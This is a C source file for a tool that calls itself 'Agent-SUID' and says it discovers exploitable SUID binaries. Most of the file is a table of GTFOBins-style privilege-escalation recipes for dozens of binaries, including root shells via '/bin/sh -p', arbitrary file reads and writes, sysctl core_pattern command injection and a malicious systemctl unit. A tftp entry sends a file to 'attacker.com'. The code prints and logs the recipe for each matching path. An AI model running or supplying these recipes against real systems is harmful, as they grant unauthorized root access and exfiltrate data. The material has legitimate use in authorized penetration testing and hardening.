        "ssh-keyscan:\n"
    "    sudo install -m =xs $(which ssh-keyscan) .\n"
    "    LFILE=file_to_read\n"
    "    ./ssh-keyscan -f $LFILE\n"
    },

    {"sshpass",
        "sshpass:\n"
    "    sudo install -m =xs $(which sshpass) .\n"
    "    ./sshpass /bin/sh -p\n"
    },

    {"start-stop-daemon",
        "start-stop-daemon:\n"
    "    sudo install -m =xs $(which start-stop-daemon) .\n"
    "    ./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p\n"
    },

    {"stdbuf",
        "stdbuf:\n"
    "    sudo install -m =xs $(which stdbuf) .\n"
    "    ./stdbuf -i0 /bin/sh -p\n"
    },

    {"strace",
        "strace:\n"
    "    sudo install -m =xs $(which strace) .\n"
    "    ./strace -o /dev/null /bin/sh -p\n"
    },

    {"strings",
        "strings:\n"
    "    sudo install -m =xs $(which strings) .\n"
    "    LFILE=file_to_read\n"
    "    ./strings \"$LFILE\"\n"
    },

    {"sysctl",
        "sysctl:\n"
    "    sudo install -m =xs $(which sysctl) .\n"
    "    COMMAND='/bin/sh -c id>/tmp/id'\n"
    "    ./sysctl \"kernel.core_pattern=|$COMMAND\"\n"
    "    sleep 9999 &\n"
    "    kill -QUIT $!\n"
    "    cat /tmp/id\n"
    },

    {"systemctl",
        "systemctl:\n"
    "    sudo install -m =xs $(which systemctl) .\n"
    "    TF=$(mktemp).service\n"
    "    echo '[Service]\n"
    "    Type=oneshot\n"
    "    ExecStart=/bin/sh -c \"id > /tmp/output\"\n"
    "    [Install]\n"
    "    WantedBy=multi-user.target' > $TF\n"
    "    ./systemctl link $TF\n"
    "    ./systemctl enable --now $TF\n"
    },

    {"tac",
        "tac:\n"
    "    sudo install -m =xs $(which tac) .\n"
    "    LFILE=file_to_read\n"
    "    ./tac -s 'RANDOM' \"$LFILE\"\n"
    },

    {"tail",
        "tail:\n"
    "    sudo install -m =xs $(which tail) .\n"
    "    LFILE=file_to_read\n"
    "    ./tail -c1G \"$LFILE\"\n"
    },

    {"taskset",
        "taskset:\n"
    "    sudo install -m =xs $(which taskset) .\n"
    "    ./taskset 1 /bin/sh -p\n"
    },

    {"tbl",
        "tbl:\n"
    "    sudo install -m =xs $(which tbl) .\n"
    "    LFILE=file_to_read\n"
    "    ./tbl $LFILE\n"
    },

    {"tclsh",
        "tclsh:\n"
    "    sudo install -m =xs $(which tclsh) .\n"
    "    ./tclsh\n"
    "    exec /bin/sh -p <@stdin >@stdout 2>@stderr\n"
    },

    {"tee",
        "tee:\n"
    "    sudo install -m =xs $(which tee) .\n"
    "    LFILE=file_to_write\n"
    "    echo DATA | ./tee -a \"$LFILE\"\n"
    },

    {"terraform",
        "terraform:\n"
    "    sudo install -m =xs $(which terraform) .\n"
    "    ./terraform console\n"
    "    file(\"file_to_read\")\n"
    },

    {"tftp",
        "tftp:\n"
    "    sudo install -m =xs $(which tftp) .\n"
    "    RHOST=attacker.com\n"
    "    ./tftp $RHOST\n"
    "    put file_to_send\n"
    },

    {"tic",
        "tic:\n"
    "    sudo install -m =xs $(which tic) .\n"
    "    LFILE=file_to_read\n"
    "    ./tic -C \"$LFILE\"\n"
    },

    {"time",
        "time:\n"
    "    sudo install -m =xs $(which time) .\n"
    "    ./time /bin/sh -p\n"
    },

    {"timeout",
        "timeout:\n"
    "    sudo install -m =xs $(which timeout) .\n"
    "    ./timeout 7d /bin/sh -p\n"
    },

    {"troff",
        "troff:\n"
    "    sudo install -m =xs $(which troff) .\n"
    "    LFILE=file_to_read\n"
    "    ./troff $LFILE\n"
    },

    {"ul",
        "ul:\n"
    "    sudo install -m =xs $(which ul) .\n"
    "    LFILE=file_to_read\n"
    "    ./ul \"$LFILE\"\n"
    },

    {"unexpand",
        "unexpand:\n"
    "    sudo install -m =xs $(which unexpand) .\n"
    "    LFILE=file_to_read\n"
    "    ./unexpand -t99999999 \"$LFILE\"\n"
    },

    {"uniq",
        "uniq:\n"
    "    sudo install -m =xs $(which uniq) .\n"
    "    LFILE=file_to_read\n"
    "    ./uniq \"$LFILE\"\n"
},

    {"unshare",
         "unshare:\n"
     "    sudo install -m =xs $(which unshare) .\n"
     "    ./unshare -r /bin/sh\n"
    },

    {"unsquashfs",
        "unsquashfs:\n"
    "    sudo install -m =xs $(which unsquashfs) .\n"
    "    ./unsquashfs shell\n"
    "    ./squashfs-root/sh -p\n"
    },

    {"unzip",
        "unzip:\n"
    "    sudo install -m =xs $(which unzip) .\n"
    "    ./unzip -K shell.zip\n"
    "    ./sh -p\n"
    },

    {"update-alternatives",
        "update-alternatives:\n"
    "    sudo install -m =xs $(which update-alternatives) .\n"
    "    LFILE=/path/to/file_to_write\n"
    "    TF=$(mktemp)\n"
    "    echo DATA >$TF\n"
    "    ./update-alternatives --force --install \"$LFILE\" x \"$TF\" 0\n"
    },

    {"uudecode",
        "uudecode:\n"
    "    sudo install -m =xs $(which uudecode) .\n"
    "    LFILE=file_to_read\n"
    "    uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    },

    {"uuencode",
        "uuencode:\n"
    "    sudo install -m =xs $(which uuencode) .\n"
    "    LFILE=file_to_read\n"
    "    uuencode \"$LFILE\" /dev/stdout | uudecode\n"
    },

    {"vagrant",
        "vagrant:\n"
    "    sudo install -m =xs $(which vagrant) .\n"
    "    cd $(mktemp -d)\n"
    "    echo 'exec \"/bin/sh -p\"' > Vagrantfile\n"
    "    vagrant up\n"
    },

    {"varnishncsa",
        "varnishncsa:\n"
    "    sudo install -m =xs $(which varnishncsa) .\n"
    "    LFILE=file_to_write\n"
    "    ./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n"
    },

    {"view",
        "view:\n"
    "    sudo install -m =xs $(which view) .\n"
    "    ./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n"
    },

    {"vigr",
        "vigr:\n"
    "    sudo install -m =xs $(which vigr) .\n"
    "    ./vigr\n"
    },

    {"vim",

        "vim:\n"
        "    sudo install -m =xs $(which vim) .\n"
        "    ./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n"
    },

    {"vimdiff",
        "vimdiff:\n"
    "    sudo install -m =xs $(which vimdiff) .\n"
    "    ./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n"

    },

    {"vipw",
        "vipw:\n"
    "    sudo install -m =xs $(which vipw) .\n"
    "    ./vipw\n"
    },

    {"w3m",
        "w3m:\n"
    "    sudo install -m =xs $(which w3m) .\n"
    "    LFILE=file_to_read\n"
    "    ./w3m \"$LFILE\" -dump\n"
    },

    {"watch",
        "watch:\n"
    "    sudo install -m =xs $(which watch) .\n"
    "    ./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'\n"
    },

    {"wc",
        "wc:\n"
    "    sudo install -m =xs $(which wc) .\n"
    "    LFILE=file_to_read\n"
    "    ./wc --files0-from \"$LFILE\"\n"
    },

    {"wget",
        "wget:\n"
    "    sudo install -m =xs $(which wget) .\n"
    "    TF=$(mktemp)\n"
    "    chmod +x $TF\n"
    "    echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF\n"
    "    ./wget --use-askpass=$TF 0\n"
    },

    {"whiptail",
        "whiptail:\n"
    "    sudo install -m =xs $(which whiptail) .\n"
    "    LFILE=file_to_read\n"
    "    ./whiptail --textbox --scrolltext \"$LFILE\" 0 0\n"
    },

    {"xargs",
        "xargs:\n"
    "    sudo install -m =xs $(which xargs) .\n"
    "    ./xargs -a /dev/null sh -p\n"
    },

    {"xdotool",
        "xdotool:\n"
    "    sudo install -m =xs $(which xdotool) .\n"
    "    ./xdotool exec --sync /bin/sh -p\n"
    },

    {"xmodmap",
        "xmodmap:\n"
    "    sudo install -m =xs $(which xmodmap) .\n"
    "    LFILE=file_to_read\n"
    "    ./xmodmap -v $LFILE\n"
    },

    {"xmore",
        "xmore:\n"
    "    sudo install -m =xs $(which xmore) .\n"
    "    LFILE=file_to_read\n"
    "    ./xmore $LFILE\n"
    },

    {"xxd",
        "xxd:\n"
    "    sudo install -m =xs $(which xxd) .\n"
    "    LFILE=file_to_read\n"
    "    ./xxd \"$LFILE\" | xxd -r\n"
    },

    {"xz",
        "xz:\n"
    "    sudo install -m =xs $(which xz) .\n"
    "    LFILE=file_to_read\n"
    "    ./xz -c \"$LFILE\" | xz -d\n"
    },

    {"yash",
        "yash:\n"
    "    sudo install -m =xs $(which yash) .\n"
    "    ./yash\n"
    },

    {"zsh",
        "zsh:\n"
    "    sudo install -m =xs $(which zsh) .\n"
    "    ./zsh\n"
    },

    {"zsoelim",
        "zsoelim:\n"
    "    sudo install -m =xs $(which zsoelim) .\n"
    "    LFILE=file_to_read\n"
    "    ./zsoelim \"$LFILE\"\n"
    }
};



// Function to create "Agent SUID" directory and log file
void setup_logging(char* log_path) {
    char dir_path[LENGTH];
    snprintf(dir_path, sizeof(dir_path), "%s/Agent SUID", getenv("HOME"));
    mkdir(dir_path, 0755); // Create the directory with read/write/execute permissions

    snprintf(log_path, LENGTH, "%s/log.txt", dir_path);
    FILE* log_file = fopen(log_path, "a");
    if (log_file) {
        time_t now = time(NULL);
        struct tm* t = localtime(&now);
        fprintf(log_file, "Run at: %04d-%02d-%02d %02d:%02d:%02d\n",
                t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
                t->tm_hour, t->tm_min, t->tm_sec);
        fclose(log_file);
    } else {
        fprintf(stderr, "Error: Cannot create log file.\n");
    }
}

// Function to extract the basename from a path
const char* get_basename(const char* path) {
    const char* base = strrchr(path, '/');
    return base ? base + 1 : path; // Return the part after the last '/'
}

// Function to find a command by keyword
const char* find_command(const char* keyword) {
    for (int i = 0; i < COMMANDS; i++) {
        if (strcmp(keyword, command_list[i].keyword) == 0) {
            return command_list[i].command;
        }
    }
    return NULL;  // Return NULL if no match is found
}

int main() {
    char paths[PATHS][LENGTH];
    char input[LENGTH];
    int num_paths = 0;
    const char* matches[PATHS];  // Array to store matching basenames
    int num_matches = 0;

    printf("\nAgent-SUID vC1.0 by CyberGhoul - the ultimate tool for discovering exploitable SUID binaries on your system. This tool is designed to help security professionals identify potential privilege escalation vectors.\n");
    printf("Enter paths one per line (press Enter on an empty line to finish):\n");
    printf("\n");

    // Logging setup
    char log_path[LENGTH];
    setup_logging(log_path);

    // Input paths
    while (1) {
        fgets(input, LENGTH, stdin);
        if (input[0] == '\n') break;
        strncpy(paths[num_paths], input, LENGTH - 1);
        paths[num_paths][LENGTH - 1] = '\0';  // Ensure null-termination
        paths[num_paths][strcspn(paths[num_paths], "\n")] = '\0';  // Remove newline
        num_paths++;
    }

    // Extract basenames and find matches
    for (int i = 0; i < num_paths; i++) {
        const char* basename = get_basename(paths[i]);
        const char* command = find_command(basename);
        if (command) {
            matches[num_matches] = basename;  // Store matching basename
            num_matches++;
        }
    }

    // Output results
    printf("\nExploitable SUID Binaries Overview: %d found\n", num_matches);
    printf("Details on privilege escalation techniques:\n");


    FILE* log_file = fopen(log_path, "a");
    if (log_file) {
        for (int i = 0; i < num_matches; i++) {
            fprintf(log_file, "Binary: %s\n", matches[i]);
            printf("-------------------------------------------------\n");
            const char* command = find_command(matches[i]);
            if (command) {
                printf("%s", command);
                fprintf(log_file, "%s\n", command);
            }
            printf("-------------------------------------------------\n");
        }
        fclose(log_file);
    } else {
        fprintf(stderr, "Error: Cannot open log file for writing.\n");
    }

    return 0;
}


